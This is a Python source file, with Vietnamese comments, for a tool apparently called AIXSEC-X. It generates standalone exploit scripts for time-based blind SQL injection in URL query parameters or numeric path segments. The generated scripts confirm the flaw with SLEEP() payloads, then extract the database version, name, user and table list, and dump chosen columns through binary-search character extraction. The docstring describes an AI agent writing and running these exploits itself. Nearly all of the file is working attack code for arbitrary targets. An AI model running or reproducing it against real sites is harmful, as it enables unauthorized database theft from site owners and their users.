#!/usr/bin/env python3
"""
aixsec-x — poc_generator.py
Tự động SINH POC Python khai thác SQLi time-based blind (KHÔNG sqlmap).

Khi sqlmap_check thất bại (timeout / no injection / không bắt được
path-injection), pipeline fallback:
    sqli_manual_test → sqli_blind_extract (detect)
        → generate_poc   (AGENT TỰ VIẾT POC Python)
        → poc_executor   (agent tự chạy POC lấy dữ liệu)

Generator tạo source Python độc lập — chỉ cần `requests`:
  - mode=query : ?id=123          → ?id=123' AND (expr) AND SLEEP(n)-- -
  - mode=path  : /search/123.html → /search/123%27...--%20-.html (giữ suffix .html)
  - action=detect   : chỉ xác nhận lỗ hổng
  - action=extract  : VERSION() + DATABASE() (+ user/tables tùy chọn)
  - action=dump     : dump table.columns qua binary search

Dùng trong tools.py (ToolSpec generate_poc / poc_executor) hoặc CLI:
  python3 poc_generator.py -u https://target/search/123.html --mode path -o poc.py
"""
from __future__ import annotations

import argparse
import sys

# ────────────────────────────────────────────────────────────
# Template — placeholder @@TOKEN@@, thay bằng .replace()
# (tránh lỗi brace khi dùng str.format trên code chứa ngoặc)
# ────────────────────────────────────────────────────────────

_TEMPLATE = '''#!/usr/bin/env python3
"""POC SQLi time-based blind (KHONG sqlmap) — sinh tu dong boi AIXSEC-X.

Target : @@URL@@
Mode   : @@MODE@@
Actions: @@ACTIONS@@

Chay:
  python3 poc.py                (dung cau hinh nhung)
  python3 poc.py -u <URL>       (override target)
  python3 poc.py --limit 20     (so dong dump)
"""
import argparse
import json
import sys
import time
from urllib.parse import parse_qs, quote, urlencode, urlparse, urlunparse

import requests

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")
CHARSET = "".join(chr(c) for c in range(32, 127))   # ASCII in ra, sap theo ord


class TimeBlindPoc:
    """Detect + extract bang binary search ASCII(SUBSTRING(...)) + SLEEP()."""

    def __init__(self, url: str, delay: float = @@DELAY@@, threshold: float = @@THRESHOLD@@,
                 timeout: int = 15):
        self.url = url
        self.delay = max(0.5, float(delay))
        self.threshold = max(0.7, float(threshold))
        self.timeout = int(timeout)
        self.s = requests.Session()
        self.s.headers["User-Agent"] = UA

        p = urlparse(url)
        self.scheme, self.netloc = p.scheme or "http", p.netloc
        self.path, self.query, self.fragment = p.path, p.query, p.fragment
        self.params = parse_qs(p.query)
        self.param = None          # query param mode
        self.seg_idx = None        # path segment mode
        self.mode = None           # query | path
        self.orig = ""
        self.quote = "'"           # detect() se brute
        self.comment = "-- -"
        self.baseline = 0.0
        self._locate()

    # -- vi tri inject --
    def _locate(self):
        for k, v in self.params.items():
            if v and str(v[0]).strip().lstrip("-").isdigit():
                self.param, self.orig, self.mode = k, str(v[0]).strip(), "query"
                return
        segs = [x for x in self.path.split("/") if x]
        for i, seg in enumerate(segs):
            core = seg.split(".")[0] if "." in seg else seg
            if core.lstrip("-").isdigit():
                self.seg_idx, self.orig, self.mode = i, core, "path"
                return

    # -- build URL --
    def _build_url(self, injected: str) -> str:
        if self.mode == "query":
            q = {}
            for k, v in self.params.items():
                q[k] = [injected] if k == self.param else list(v)
            return urlunparse((self.scheme, self.netloc, self.path, "",
                               urlencode(q, doseq=True), self.fragment))
        segs = [x for x in self.path.split("/") if x]
        raw = segs[self.seg_idx]
        suffix = ""
        if "." in raw:
            suffix = "." + raw.split(".", 1)[1]    # giu .html
        segs[self.seg_idx] = quote(injected, safe="") + suffix
        return urlunparse((self.scheme, self.netloc, "/" + "/".join(segs), "",
                           self.query, self.fragment))

    def _payload(self, expr: str) -> str:
        return ("{0}{1} AND ({2}) AND SLEEP({3}){4}"
                .format(self.orig, self.quote, expr, self.delay, self.comment))

    def _req(self, injected: str) -> float:
        try:
            t0 = time.time()
            self.s.get(self._build_url(injected), timeout=self.timeout,
                       allow_redirects=True)
            return time.time() - t0
        except Exception:
            return 0.0

    # -- detect --
    def detect(self) -> bool:
        if not self.mode:
            print("[-] Khong tim thay tham so/path so de inject")
            return False
        print("[*] Injection position: {0} mode={1}".format(self.orig, self.mode))
        self.baseline = self._req(self.orig)
        print("[*] Baseline: {0:.2f}s".format(self.baseline), flush=True)
        for q in ("'", '"', ""):
            for c in ("-- -", "#", ""):
                self.quote, self.comment = q, c
                t = self._req(self._payload("SLEEP(%d)" % self.delay))
                d = t - self.baseline
                print("    quote={0:<5} comment={1:<5} -> {2:.2f}s (delta {3:+.2f}s)"
                      .format(q or "none", c or "none", t, d), flush=True)
                if d >= self.threshold:
                    print("[+] SQLi CONFIRMED - mode={0} quote={1} comment={2}"
                          .format(self.mode, q or "none", c or "none"), flush=True)
                    return True
        print("[-] SQLi NOT CONFIRMED")
        return False

    # -- extraction --
    def _is_true(self, expr: str) -> bool:
        return (self._req(self._payload(expr)) - self.baseline) >= self.threshold

    def extract_char(self, expr: str, pos: int) -> str:
        lo, hi = 0, len(CHARSET) - 1
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self._is_true("ASCII(SUBSTRING(({0}),{1},1))>={2}"
                             .format(expr, pos, ord(CHARSET[mid]))):
                lo = mid
            else:
                hi = mid - 1
        if self._is_true("ASCII(SUBSTRING(({0}),{1},1))={2}"
                         .format(expr, pos, ord(CHARSET[lo]))):
            return CHARSET[lo]
        return ""

    def extract_string(self, expr: str, max_len: int = 60) -> str:
        out = []
        for pos in range(1, max_len + 1):
            ch = self.extract_char(expr, pos)
            if not ch:
                break
            out.append(ch)
            print("    [{0}] pos {1} = {2!r}  {3}"
                  .format(expr[:38], pos, ch, "".join(out)), flush=True)
        return "".join(out)

    def version(self) -> str:
        return self.extract_string("VERSION()", 40)

    def database(self) -> str:
        return self.extract_string("DATABASE()", 60)

    def user(self) -> str:
        return self.extract_string("USER()", 60)

    def tables(self, db: str = "") -> str:
        q = ("SELECT GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES"
             + (" WHERE TABLE_SCHEMA='{0}'".format(db) if db else ""))
        return self.extract_string(q, 200)

    def dump(self, table: str, columns: list, limit: int = 10) -> list:
        rows = []
        for i in range(1, limit + 1):
            row = {}
            for col in columns:
                row[col] = self.extract_string(
                    "SELECT {0} FROM {1} LIMIT 1 OFFSET {2}".format(col, table, i - 1), 60)
            if not row or all(not v for v in row.values()):
                break
            rows.append(row)
        return rows


def main() -> int:
    ap = argparse.ArgumentParser(description="POC SQLi time-based blind")
    ap.add_argument("-u", "--url", default="@@URL@@")
    ap.add_argument("--delay", type=float, default=@@DELAY@@)
    ap.add_argument("--threshold", type=float, default=@@THRESHOLD@@)
    ap.add_argument("--timeout", type=int, default=15)
    ap.add_argument("--limit", type=int, default=10)
    args = ap.parse_args()

    ex = TimeBlindPoc(args.url, args.delay, args.threshold, args.timeout)
    print("=" * 56)
    print("POC SQLi blind | {0} | delay={1}s".format(args.url, args.delay))
    print("=" * 56)
    if not ex.detect():
        return 1
    @@MAIN_BODY@@
    return 0


if __name__ == "__main__":
    sys.exit(main())
'''

# ── khối hành động cho @@MAIN_BODY@@ ──
_MAIN_DETECT = '''    print("[+] CONFIRMED (detect-only)")'''

_MAIN_EXTRACT = '''    print("[*] Extracting VERSION() ...", flush=True)
    print("[+] version: {0}".format(ex.version()))
    print("[*] Extracting DATABASE() ...", flush=True)
    print("[+] database: {0}".format(ex.database()))@@EXTRACT_EXTRA@@'''

_EXTRACT_USER = '''
    print("[*] Extracting USER() ...", flush=True)
    print("[+] user: {0}".format(ex.user()))'''

_EXTRACT_TABLES = '''
    print("[*] Listing tables ...", flush=True)
    print("[+] tables: {0}".format(ex.tables()))'''

_MAIN_DUMP = '''    print("[*] Dumping @@TABLE@@.@@COLUMNS@@ (limit {0}) ..."
          .format(args.limit), flush=True)
    try:
        cols = [c.strip() for c in "@@COLUMNS@@".split(",") if c.strip()]
        rows = ex.dump("@@TABLE@@", cols, args.limit)
    except Exception as e:
        print("[!] dump loi: {0}".format(e))
        return 1
    if not rows:
        print("[-] Khong lay duoc dong nao (blind extraction rat cham?)")
    for r in rows:
        print("[+] row: {0}".format(json.dumps(r, ensure_ascii=False)))'''


def generate_poc(
    url: str,
    mode: str = "query",
    action: str = "extract",
    delay: float = 3.0,
    threshold: float = 2.5,
    table: str = "",
    columns: str = "",
    include_user: bool = False,
    include_tables: bool = False,
    limit: int = 10,
) -> str:
    """Sinh source Python hoàn chỉnh khai thác SQLi time-based blind."""
    if mode not in ("query", "path"):
        raise ValueError("mode phải là query|path (nhận %r)" % mode)
    if action not in ("detect", "extract", "dump"):
        raise ValueError("action phải là detect|extract|dump (nhận %r)" % action)
    if action == "dump" and (not table or not columns):
        raise ValueError("action=dump cần table + columns")

    actions = {"detect": "chi xac nhan",
               "extract": "version + database",
               "dump": "dump %s.%s" % (table, columns)}[action]
    if mode == "path":
        actions += " (path-injection)"

    if action == "detect":
        main = _MAIN_DETECT
    elif action == "dump":
        main = _MAIN_DUMP
    else:
        extra = ""
        if include_user:
            extra += _EXTRACT_USER
        if include_tables:
            extra += _EXTRACT_TABLES
        main = _MAIN_EXTRACT.replace("@@EXTRACT_EXTRA@@", extra)

    code = _TEMPLATE
    code = code.replace("@@URL@@", url)
    code = code.replace("@@MODE@@", mode)
    code = code.replace("@@ACTIONS@@", actions)
    code = code.replace("@@DELAY@@", repr(float(delay)))
    code = code.replace("@@THRESHOLD@@", repr(float(threshold)))
    code = code.replace("@@MAIN_BODY@@", main)
    code = code.replace("@@TABLE@@", table)
    code = code.replace("@@COLUMNS@@", columns)
    return code


def cli() -> int:
    ap = argparse.ArgumentParser(description="Sinh POC SQLi time-based blind (khong sqlmap)")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--mode", default="query", choices=["query", "path"])
    ap.add_argument("--action", default="extract", choices=["detect", "extract", "dump"])
    ap.add_argument("--delay", type=float, default=3.0)
    ap.add_argument("--threshold", type=float, default=2.5)
    ap.add_argument("--table", default="")
    ap.add_argument("--columns", default="")
    ap.add_argument("--include-user", action="store_true")
    ap.add_argument("--include-tables", action="store_true")
    ap.add_argument("--limit", type=int, default=10)
    ap.add_argument("-o", "--output", default="", help="Ghi code ra file (mặc định in ra stdout)")
    args = ap.parse_args()

    code = generate_poc(args.url, args.mode, args.action, args.delay, args.threshold,
                        args.table, args.columns, args.include_user, args.include_tables,
                        args.limit)
    if args.output:
        with open(args.output, "w") as f:
            f.write(code)
        print("[+] Da ghi POC vao %s" % args.output)
    else:
        print(code)
    return 0


if __name__ == "__main__":
    sys.exit(cli())